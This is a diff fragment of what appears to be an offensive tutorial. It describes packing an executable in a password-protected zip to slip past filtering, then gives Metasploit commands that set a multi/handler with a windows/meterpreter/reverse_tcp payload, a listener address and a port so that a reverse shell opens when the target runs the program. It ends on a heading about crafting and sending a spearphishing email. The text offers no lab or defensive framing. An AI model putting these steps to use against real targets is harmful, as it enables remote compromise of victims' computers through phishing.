@@ -13,3 +13,15 @@ We need to zip the _.exe_ file using a password-protected zip in order to bypass
 
 When prompted for a password, write:
 `123445`
+
+Next, we will set up a listener in Metasploit to obtain a reverse shell when the target executes our program.
+`msfconsole`
+
+Execute the following commands to configure the exploit and payload with the correct IP address and port for the reverse connection. use exploit/multi/handler
+
+`set payload windows/meterpreter/reverse_tcp`
+`set LHOST 192.168.1.100`
+`set LPORT 2222`
+`exploit`
+
+# Crafting and Sending the Spearphishing Email
